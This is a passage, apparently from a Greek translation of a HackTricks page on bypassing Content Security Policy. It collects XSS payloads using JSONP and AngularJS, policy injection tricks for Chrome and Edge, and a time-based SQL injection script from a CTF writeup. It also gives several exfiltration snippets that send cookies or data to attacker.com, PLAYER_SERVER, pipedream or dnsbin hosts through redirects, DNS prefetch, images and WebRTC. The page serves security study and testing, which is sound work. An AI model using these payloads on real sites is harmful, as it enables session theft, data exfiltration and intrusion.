<script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>
ng-app"ng-csp ng-click=$event.view.alert(1337)><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>

<!-- no longer working -->
<script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)">
```
Άλλα σημεία εκτέλεσης JSONP μπορούν να βρεθούν [**εδώ**](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt) (μερικά από αυτά διαγράφηκαν ή διορθώθηκαν)

### Διέλευση μέσω Ανακατεύθυνσης

Τι συμβαίνει όταν το CSP αντιμετωπίζει ανακατευθύνσεις στην πλευρά του διακομιστή; Αν η ανακατεύθυνση οδηγεί σε μια διαφορετική προέλευση που δεν επιτρέπεται, τότε θα αποτύχει.

Ωστόσο, σύμφωνα με την περιγραφή στο [CSP spec 4.2.2.3. Paths and Redirects](https://www.w3.org/TR/CSP2/#source-list-paths-and-redirects), αν η ανακατεύθυνση οδηγεί σε διαφορετική διαδρομή, μπορεί να παρακάμψει τους αρχικούς περιορισμούς.

Εδώ υπάρχει ένα παράδειγμα:
```html
<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Security-Policy" content="script-src http://localhost:5555 https://www.google.com/a/b/c/d">
</head>
<body>
<div id=userContent>
<script src="https://https://www.google.com/test"></script>
<script src="https://https://www.google.com/a/test"></script>
<script src="http://localhost:5555/301"></script>
</div>
</body>
</html>
```
Εάν το CSP έχει οριστεί σε `https://www.google.com/a/b/c/d`, αφού λαμβάνεται υπόψη το μονοπάτι, τόσο τα σενάρια `/test` όσο και `/a/test` θα αποκλειστούν από το CSP.

Ωστόσο, το τελικό `http://localhost:5555/301` θα **ανακατευθυνθεί στην πλευρά του διακομιστή σε `https://www.google.com/complete/search?client=chrome&q=123&jsonp=alert(1)//`**. Καθώς πρόκειται για ανακατεύθυνση, το **μονοπάτι δεν λαμβάνεται υπόψη**, και το **σενάριο μπορεί να φορτωθεί**, παρακάμπτοντας έτσι τον περιορισμό του μονοπατιού.

Με αυτήν την ανακατεύθυνση, ακόμη κι αν το μονοπάτι καθορίζεται πλήρως, θα παρακαμφθεί.

Συνεπώς, η καλύτερη λύση είναι να διασφαλίσετε ότι η ιστοσελίδα δεν έχει κενές ευκαιρίες ανακατεύθυνσης και ότι δεν υπάρχουν τομείς που μπορούν να εκμεταλλευτούν στους κανόνες του CSP.

### Παράκαμψη CSP με κρεμαστό σήμα

Διαβάστε [εδώ](../dangling-markup-html-scriptless-injection/) πώς.

### 'unsafe-inline'; img-src \*; μέσω XSS
```
default-src 'self' 'unsafe-inline'; img-src *;
```
`'unsafe-inline'` σημαίνει ότι μπορείτε να εκτελέσετε οποιοδήποτε script μέσα στον κώδικα (το XSS μπορεί να εκτελέσει κώδικα) και `img-src *` σημαίνει ότι μπορείτε να χρησιμοποιήσετε στην ιστοσελίδα οποιαδήποτε εικόνα από οποιαδήποτε πηγή.

Μπορείτε να παρακάμψετε αυτό το CSP μεταφέροντας τα δεδομένα μέσω εικόνων (σε αυτήν την περίπτωση το XSS καταχράται ένα CSRF όπου μια σελίδα προσβάσιμη από το bot περιέχει ένα SQLi και εξάγει τη σημαία μέσω μιας εικόνας):
```javascript
<script>fetch('http://x-oracle-v0.nn9ed.ka0labs.org/admin/search/x%27%20union%20select%20flag%20from%20challenge%23').then(_=>_.text()).then(_=>new Image().src='http://PLAYER_SERVER/?'+_)</script>
```
From: [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

Μπορείτε επίσης να καταχραστείτε αυτή τη διαμόρφωση για **φόρτωση κώδικα JavaScript που έχει εισαχθεί μέσα σε μια εικόνα**. Για παράδειγμα, αν η σελίδα επιτρέπει τη φόρτωση εικόνων από το Twitter. Μπορείτε να **δημιουργήσετε** μια **ειδική εικόνα**, να την **ανεβάσετε** στο Twitter και να καταχραστείτε το "**unsafe-inline**" για να **εκτελέσετε** έναν κώδικα JS (όπως ένα κανονικό XSS) που θα **φορτώσει** την **εικόνα**, θα **εξάγει** τον **JS** από αυτήν και θα τον **εκτελέσει**: [https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/](https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/)

### Με Εργαζόμενους Υπηρεσιών

Η λειτουργία **`importScripts`** των εργαζομένων υπηρεσιών δεν περιορίζεται από το CSP:

{% content-ref url="../xss-cross-site-scripting/abusing-service-workers.md" %}
[abusing-service-workers.md](../xss-cross-site-scripting/abusing-service-workers.md)
{% endcontent-ref %}

### Έγχυση Πολιτικής

**Έρευνα:** [**https://portswigger.net/research/bypassing-csp-with-policy-injection**](https://portswigger.net/research/bypassing-csp-with-policy-injection)

#### Chrome

Αν ένα **παράμετρος** που στέλνετε από εσάς είναι **επικολλημένος μέσα** στη **δήλωση** της **πολιτικής**, τότε μπορείτε να **τροποποιήσετε** τη **πολιτική** με τρόπο που την καθιστά **άχρηστη**. Μπορείτε να **επιτρέψετε το script 'unsafe-inline'** με οποιαδήποτε από αυτές τις παρακάμψεις:
```bash
script-src-elem *; script-src-attr *
script-src-elem 'unsafe-inline'; script-src-attr 'unsafe-inline'
```
Διότι αυτή η οδηγία θα **αντικαταστήσει τις υπάρχουσες οδηγίες script-src**.\
Μπορείτε να βρείτε ένα παράδειγμα εδώ: [http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E](http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E)

#### Edge

Στο Edge είναι πολύ απλό. Αν μπορείτε να προσθέσετε στο CSP μόνο αυτό: **`;_`** το **Edge** θα **απορρίψει** ολόκληρη τη **πολιτική**.\
Παράδειγμα: [http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert(1)%3C/script%3E](http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert\(1\)%3C/script%3E)

### img-src \*; μέσω XSS (iframe) - Χρονική επίθεση

Παρατηρήστε την απουσία της οδηγίας `'unsafe-inline'`\
Αυτή τη φορά μπορείτε να κάνετε το θύμα **να φορτώσει** μια σελίδα υπό **τον έλεγχό σας** μέσω **XSS** με ένα `<iframe>`. Αυτή τη φορά θα κάνετε το θύμα να έχει πρόσβαση στη σελίδα από όπου θέλετε να εξάγετε πληροφορίες (**CSRF**). Δεν μπορείτε να έχετε πρόσβαση στο περιεχόμενο της σελίδας, αλλά αν με κάποιον τρόπο μπορείτε να **ελέγξετε το χρόνο που χρειάζεται η σελίδα για να φορτωθεί** μπορείτε να εξάγετε τις πληροφορίες που χρειάζεστε.

Αυτή τη φορά θα εξαχθεί ένα **σημαία**, κάθε φορά που μια **χαρακτήρας μαντεύεται σωστά** μέσω SQLi η **απόκριση** παίρνει **περισσότερο χρόνο** λόγω της συνάρτησης ύπνου. Τότε, θα μπορείτε να εξάγετε τη σημαία:
```html
<!--code from https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle -->
<iframe name=f id=g></iframe> // The bot will load an URL with the payload
<script>
let host = "http://x-oracle-v1.nn9ed.ka0labs.org";
function gen(x) {
x = escape(x.replace(/_/g, '\\_'));
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag%20like%20'${x}%25'and%201=sleep(0.1)%23`;
}

function gen2(x) {
x = escape(x);
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag='${x}'and%201=sleep(0.1)%23`;
}

async function query(word, end=false) {
let h = performance.now();
f.location = (end ? gen2(word) : gen(word));
await new Promise(r => {
g.onload = r;
});
let diff = performance.now() - h;
return diff > 300;
}

let alphabet = '_abcdefghijklmnopqrstuvwxyz0123456789'.split('');
let postfix = '}'

async function run() {
let prefix = 'nn9ed{';
while (true) {
let i = 0;
for (i;i<alphabet.length;i++) {
let c = alphabet[i];
let t =  await query(prefix+c); // Check what chars returns TRUE or FALSE
console.log(prefix, c, t);
if (t) {
console.log('FOUND!')
prefix += c;
break;
}
}
if (i==alphabet.length) {
console.log('missing chars');
break;
}
let t = await query(prefix+'}', true);
if (t) {
prefix += '}';
break;
}
}
new Image().src = 'http://PLAYER_SERVER/?' + prefix; //Exfiltrate the flag
console.log(prefix);
}

run();
</script>
```
### Μέσω των Bookmarklets

Αυτή η επίθεση θα περιλάμβανε κάποια κοινωνική μηχανική όπου ο επιτιθέμενος **πείθει τον χρήστη να σύρει και να αποθέσει ένα σύνδεσμο πάνω στο bookmarklet του προγράμματος περιήγησης**. Αυτό το bookmarklet θα περιείχε **κακόβουλο κώδικα javascript** που όταν σύρθηκε και αποθέστηκε ή κάνοντας κλικ θα εκτελούνταν στο πλαίσιο του τρέχοντος παραθύρου ιστοσελίδας, **παρακάμπτοντας το CSP και επιτρέποντας την κλοπή ευαίσθητων πληροφοριών** όπως cookies ή τεκμήρια.

Για περισσότερες πληροφορίες [**ελέγξτε την αρχική αναφορά εδώ**](https://socradar.io/csp-bypass-unveiled-the-hidden-threat-of-bookmarklets/).

### Παράκαμψη CSP περιορίζοντας το CSP

Σε [**αυτήν την ανάλυση CTF**](https://github.com/google/google-ctf/tree/master/2023/web-biohazard/solution), το CSP παρακάμπτεται με την εισαγωγή μέσα σε ένα επιτρεπόμενο iframe ένα πιο περιοριστικό CSP που απαγόρευε τη φόρτωση ενός συγκεκριμένου αρχείου JS που, στη συνέχεια, μέσω **μόλυνσης πρωτοτύπου** ή **καταστροφής dom** επέτρεψε να **καταχραστεί ένα διαφορετικό script για τη φόρτωση ενός αυθαίρετου script**.

Μπορείτε **να περιορίσετε ένα CSP ενός Iframe** με το χαρακτηριστικό **`csp`**:

{% code overflow="wrap" %}
```html
<iframe src="https://biohazard-web.2023.ctfcompetition.com/view/[bio_id]" csp="script-src https://biohazard-web.2023.ctfcompetition.com/static/closure-library/ https://biohazard-web.2023.ctfcompetition.com/static/sanitizer.js https://biohazard-web.2023.ctfcompetition.com/static/main.js 'unsafe-inline' 'unsafe-eval'"></iframe>
```
{% endcode %}

Στο [**αυτό το CTF writeup**](https://github.com/aszx87410/ctf-writeups/issues/48), ήταν δυνατό μέσω **HTML injection** να **περιοριστεί** περισσότερο ένα **CSP** έτσι ώστε ένα script που αποτρέπει το CSTI να απενεργοποιηθεί και επομένως η **ευπάθεια να γίνει εκμεταλλεύσιμη.**\
Το CSP μπορεί να γίνει πιο περιοριστικό χρησιμοποιώντας **HTML meta tags** και τα inline scripts μπορούν να απενεργοποιηθούν **αφαιρώντας** τη **καταχώριση** που επιτρέπει το **nonce** τους και **ενεργοποιώντας συγκεκριμένο inline script μέσω sha**:
```html
<meta http-equiv="Content-Security-Policy" content="script-src 'self'
'unsafe-eval' 'strict-dynamic'
'sha256-whKF34SmFOTPK4jfYDy03Ea8zOwJvqmz%2boz%2bCtD7RE4='
'sha256-Tz/iYFTnNe0de6izIdG%2bo6Xitl18uZfQWapSbxHE6Ic=';">
```
### JS εξυπηρέτηση με Content-Security-Policy-Report-Only

Εάν μπορείτε να καταφέρετε να κάνετε τον εξυπηρετητή να ανταποκριθεί με την κεφαλίδα **`Content-Security-Policy-Report-Only`** με μια **τιμή που ελέγχετε εσείς** (ίσως λόγω ενός CRLF), θα μπορούσατε να τον κατευθύνετε προς τον δικό σας εξυπηρετητή και αν **τυλίξετε** το **περιεχόμενο JS** που θέλετε να εξυπηρετήσετε με **`<script>`** και επειδή είναι πολύ πιθανό να μην επιτρέπεται το `unsafe-inline` από το CSP, αυτό θα **ενεργοποιήσει ένα σφάλμα CSP** και ένα μέρος του script (που περιέχει τις ευαίσθητες πληροφορίες) θα σταλεί στον εξυπηρετητή από το `Content-Security-Policy-Report-Only`.

Για ένα παράδειγμα [**ελέγξτε αυτό το CTF writeup**](https://github.com/maple3142/My-CTF-Challenges/tree/master/TSJ%20CTF%202022/Nim%20Notes).

### [CVE-2020-6519](https://www.perimeterx.com/tech-blog/2020/csp-bypass-vuln-disclosure/)
```javascript
document.querySelector('DIV').innerHTML="<iframe src='javascript:var s = document.createElement(\"script\");s.src = \"https://pastebin.com/raw/dw5cWGK6\";document.body.appendChild(s);'></iframe>";
```
### Διαρροή Πληροφοριών με CSP και Iframe

* Δημιουργείται ένα `iframe` που δείχνει σε ένα URL (ας το αποκαλέσουμε `https://example.redirect.com`) το οποίο επιτρέπεται από το CSP.
* Αυτό το URL στη συνέχεια ανακατευθύνει σε ένα μυστικό URL (π.χ., `https://usersecret.example2.com`) το οποίο **δεν επιτρέπεται** από το CSP.
* Ακούγοντας το γεγονός `securitypolicyviolation`, μπορεί κανείς να αιχμαλωτίσει την ιδιότητα `blockedURI`. Αυτή η ιδιότητα αποκαλύπτει τον τομέα του μπλοκαρισμένου URI, διαρρέοντας τον μυστικό τομέα στον οποίο ανακατευθύνθηκε το αρχικό URL.

Είναι ενδιαφέρον να σημειωθεί ότι προγράμματα περιήγησης όπως το Chrome και το Firefox έχουν διαφορετική συμπεριφορά στην χειρισμό των iframes όσον αφορά το CSP, οδηγώντας σε πιθανή διαρροή ευαίσθητων πληροφοριών λόγω μη ορισμένης συμπεριφοράς.

Μια άλλη τεχνική περιλαμβάνει την εκμετάλλευση του ίδιου του CSP για να εξάγει το μυστικό υποτομέα. Αυτή η μέθοδος βασίζεται σε έναν αλγόριθμο δυαδικής αναζήτησης και στην προσαρμογή του CSP για να περιλαμβάνει συγκεκριμένους τομείς που αποκλείονται εσκεμμένα. Για παράδειγμα, αν ο μυστικός υποτομέας αποτελείται από άγνωστους χαρακτήρες, μπορείτε να δοκιμάσετε επαναληπτικά διαφορετικούς υποτομείς τροποποιώντας την κατευθυντική γραμμή CSP για να μπλοκάρετε ή να επιτρέψετε αυτούς τους υποτομείς. Εδώ υπάρχει ένα απόσπασμα που δείχνει πώς μπορεί να ρυθμιστεί το CSP για να διευκολύνει αυτήν τη μέθοδο:
```markdown
img-src https://chall.secdriven.dev https://doc-1-3213.secdrivencontent.dev https://doc-2-3213.secdrivencontent.dev ... https://doc-17-3213.secdriven.dev
```
Παρακολουθώντας ποια αιτήματα αποκλείονται ή επιτρέπονται από το CSP, κάποιος μπορεί να περιορίσει τους πιθανούς χαρακτήρες στο μυστικό subdomain, αποκαλύπτοντας τελικά τον πλήρη URL.

Και οι δύο μέθοδοι εκμεταλλεύονται τις λεπτομέρειες της υλοποίησης και τη συμπεριφορά του CSP στους browsers, δείχνοντας πώς πολιτικές που φαίνονται ασφαλείς μπορούν αθέλητα να διαρρεύσουν ευαίσθητες πληροφορίες.

Κόλπο από [**εδώ**](https://ctftime.org/writeup/29310).

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Συμμετέχετε στον [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) διακομιστή για επικοινωνία με έμπειρους χάκερ και κυνηγούς ευρημάτων ασφαλείας!

**Εισαγωγή στο Hacking**\
Ασχοληθείτε με περιεχόμενο που εξερευνά την αγωνία και τις προκλήσεις του χάκινγκ

**Ειδήσεις Χάκινγκ σε Πραγματικό Χρόνο**\
Μείνετε ενήμεροι με τον γρήγορο ρυθμό του κόσμου του χάκινγκ μέσω ειδήσεων και αναλύσεων σε πραγματικό χρόνο

**Τελευταίες Ανακοινώσεις**\
Μείνετε ενήμεροι με τις νεότερες κυνηγεσίες ευρημάτων που ξεκινούν και τις κρίσιμες ενημερώσεις της πλατφόρμας

**Συμμετέχετε μαζί μας** στο [**Discord**](https://discord.com/invite/N3FrSbmwdy) και αρχίστε να συνεργάζεστε με κορυφαίους χάκερ σήμερα!

## Μη Ασφαλείς Τεχνολογίες για Παράκαμψη του CSP

### Υπερφόρτωση απάντησης PHP buffer

Το PHP είναι γνωστό για την **υπερφόρτωση της απάντησης σε 4096** bytes από προεπιλογή. Επομένως, αν το PHP εμφανίζει προειδοποίηση, παρέχοντας **αρκετά δεδομένα μέσα στις προειδοποιήσεις**, η **απάντηση** θα **σταλεί** **πριν από** τον **κεφαλίδα CSP**, προκαλώντας την αγνόηση της κεφαλίδας.\
Στη συνέχεια, η τεχνική αποτελείται βασικά από το **γέμισμα του buffer απάντησης με προειδοποιήσεις** ώστε η κεφαλίδα CSP να μην σταλεί.

Ιδέα από [**αυτό το writeup**](https://hackmd.io/@terjanq/justCTF2020-writeups#Baby-CSP-web-6-solves-406-points).

### Αναδιατύπωση Σελίδας Σφάλματος

Από [**αυτό το writeup**](https://blog.ssrf.kr/69) φαίνεται ότι ήταν δυνατό να παρακάμψει κάποιος μια προστασία CSP φορτώνοντας μια σελίδα σφάλματος (πιθανώς χωρίς CSP) και αναδιατυπώνοντας το περιεχόμενό της.
```javascript
a = window.open('/' + 'x'.repeat(4100));
setTimeout(function() {
a.document.body.innerHTML = `<img src=x onerror="fetch('https://filesharing.m0lec.one/upload/ffffffffffffffffffffffffffffffff').then(x=>x.text()).then(x=>fetch('https://enllwt2ugqrt.x.pipedream.net/'+x))">`;
}, 1000);
```
### SOME + 'self' + wordpress

Το SOME είναι μια τεχνική που καταχράζεται ένα XSS (ή πολύ περιορισμένο XSS) **σε ένα τέλος μιας σελίδας** για να **καταχραστεί** **άλλα τέλη της ίδιας προέλευσης.** Αυτό γίνεται φορτώνοντας το ευάλωτο τέλος από μια σελίδα επιτιθέμενου και στη συνέχεια ανανεώνοντας τη σελίδα επιτιθέμενου στο πραγματικό τέλος στην ίδια προέλευση που θέλετε να καταχραστείτε. Με αυτόν τον τρόπο το **ευάλωτο τέλος** μπορεί να χρησιμοποιήσει το αντικείμενο **`opener`** στο **φορτίο** για να **έχει πρόσβαση στο DOM** του **πραγματικού τέλους που θέλετε να καταχραστείτε**. Για περισσότερες πληροφορίες ελέγξτε:

{% content-ref url="../xss-cross-site-scripting/some-same-origin-method-execution.md" %}
[some-same-origin-method-execution.md](../xss-cross-site-scripting/some-same-origin-method-execution.md)
{% endcontent-ref %}

Επιπλέον, το **wordpress** έχει ένα τέλος **JSONP** στο `/wp-json/wp/v2/users/1?_jsonp=data` που θα **αντανακλά** τα **δεδομένα** που στάλθηκαν στην έξοδο (με τον περιορισμό μόνο γραμμάτων, αριθμών και τελείες).

Ένας επιτιθέμενος μπορεί να καταχραστεί αυτό το τέλος για να **προκαλέσει μια επίθεση SOME** εναντίον του WordPress και να την **ενσωματώσει** μέσα στο `<script s`rc=`/wp-json/wp/v2/users/1?_jsonp=some_attack></script>` σημειώστε ότι αυτό το **script** θα **φορτωθεί** επειδή είναι **επιτρεπόμενο από το 'self'**. Επιπλέον, και επειδή το WordPress είναι εγκατεστημένο, ένας επιτιθέμενος μπορεί να καταχραστεί την **επίθεση SOME** μέσω του **ευάλωτου τέλους κλήσης** που **παρακάμπτει το CSP** για να δώσει περισσότερα προνόμια σε έναν χρήστη, να εγκαταστήσει ένα νέο πρόσθετο...\
Για περισσότερες πληροφορίες σχετικά με το πώς να εκτελέσετε αυτήν την επίθεση ελέγξτε [https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/](https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/)

## Παρακάμψεις Εξαγωγής CSP

Αν υπάρχει ένα αυστηρό CSP που δεν σας επιτρέπει να **αλληλεπιδράτε με εξωτερικούς διακομιστές**, υπάρχουν μερικά πράγματα που μπορείτε πάντα να κάνετε για να εξαγάγετε τις πληροφορίες.

### Τοποθεσία

Μπορείτε απλά να ενημερώσετε την τοποθεσία για να στείλετε στον διακινδυνευτικό διακομιστή του επιτιθέμενου τις μυστικές πληροφορίες:
```javascript
var sessionid = document.cookie.split('=')[1]+".";
document.location = "https://attacker.com/?" + sessionid;
```
### Ετικέτα Meta

Μπορείτε να κατευθύνετε με την εισαγωγή μιας ετικέτας meta (αυτό είναι απλά μια κατεύθυνση, δεν θα διαρρεύσει περιεχόμενο)
```html
<meta http-equiv="refresh" content="1; http://attacker.com">
```
### DNS Prefetch

Για να φορτώνουν οι σελίδες γρηγορότερα, οι περιηγητές πρόκειται να προ-αναλύουν τα ονόματα κεντρικών υπολογιστών σε διευθύνσεις IP και να τα αποθηκεύουν στη μνήμη cache για μετέπειτα χρήση.\
Μπορείτε να υποδείξετε σε έναν περιηγητή να προ-αναλύσει ένα όνομα κεντρικού υπολογιστή με: `<link reol="dns-prefetch" href="something.com">`

Μπορείτε να εκμεταλλευτείτε αυτήν τη συμπεριφορά για **εξαγωγή ευαίσθητων πληροφοριών μέσω αιτημάτων DNS**:
```javascript
var sessionid = document.cookie.split('=')[1]+".";
var body = document.getElementsByTagName('body')[0];
body.innerHTML = body.innerHTML + "<link rel=\"dns-prefetch\" href=\"//" + sessionid + "attacker.ch\">";
```
### Άλλος τρόπος:

```html
Εναλλακτική μέθοδος:
```
```javascript
const linkEl = document.createElement('link');
linkEl.rel = 'prefetch';
linkEl.href = urlWithYourPreciousData;
document.head.appendChild(linkEl);
```
Για να αποφευχθεί αυτό, ο διακομιστής μπορεί να στείλει την κεφαλίδα HTTP:
```
X-DNS-Prefetch-Control: off
```
{% hint style="info" %}
Φαίνεται ότι αυτή η τεχνική δεν λειτουργεί σε headless browsers (bots)
{% endhint %}

### WebRTC

Σε πολλές σελίδες μπορείτε να διαβάσετε ότι **το WebRTC δεν ελέγχει την πολιτική `connect-src`** του CSP.

Πράγματι, μπορείτε να _διαρρεύσετε_ πληροφορίες χρησιμοποιώντας ένα _αίτημα DNS_. Ελέγξτε αυτόν τον κώδικα:
```javascript
(async()=>{p=new RTCPeerConnection({iceServers:[{urls: "stun:LEAK.dnsbin"}]});p.createDataChannel('');p.setLocalDescription(await p.createOffer())})()
```
Άλλη μια επιλογή:
```javascript
var pc = new RTCPeerConnection({
"iceServers":[
{"urls":[
"turn:74.125.140.127:19305?transport=udp"
],"username":"_all_your_data_belongs_to_us",
"credential":"."
}]
});
pc.createOffer().then((sdp)=>pc.setLocalDescription(sdp);
```
## Έλεγχος Πολιτικών CSP Online

* [https://csp-evaluator.withgoogle.com/](https://csp-evaluator.withgoogle.com)
* [https://cspvalidator.org/](https://cspvalidator.org/#url=https://cspvalidator.org/)

## Αυτόματη δημιουργία CSP

[https://csper.io/docs/generating-content-security-policy](https://csper.io/docs/generating-content-security-policy)

## Αναφορές

* [https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/](https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/)
* [https://lcamtuf.coredump.cx/postxss/](https://lcamtuf.coredump.cx/postxss/)
* [https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d](https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d)
* [https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme](https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme)
* [https://www.youtube.com/watch?v=MCyPuOWs3dg](https://www.youtube.com/watch?v=MCyPuOWs3dg)
* [https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/](https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/)
* [https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/)

​

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Συμμετέχετε στον [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) διακομιστή για επικοινωνία με έμπειρους χάκερ και κυνηγούς ευρημάτων ασφαλείας!

**Εισαγωγή στο Hacking**\
Ασχοληθείτε με περιεχόμενο που εξερευνά την αγωνία και τις προκλήσεις του χάκινγκ

**Ειδήσεις Χάκινγκ σε Πραγματικό Χρόνο**\
Μείνετε ενημερωμένοι με τον γρήγορο ρυθμό του κόσμου του χάκινγκ μέσω ειδήσεων και αναλύσεων σε πραγματικό χρόνο

**Τελευταίες Ανακοινώσεις**\
Μείνετε ενήμεροι με τις νεότερες ανακοινώσεις για νέες αμοιβές ευρημάτων και κρίσιμες ενημερώσεις πλατφόρμας

**Συμμετέχετε στο** [**Discord**](https://discord.com/invite/N3FrSbmwdy) και αρχίστε τη συνεργασία με κορυφαίους χάκερ σήμερα!

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Συμμετέχετε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή την [**ομάδα τηλεγραφή**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
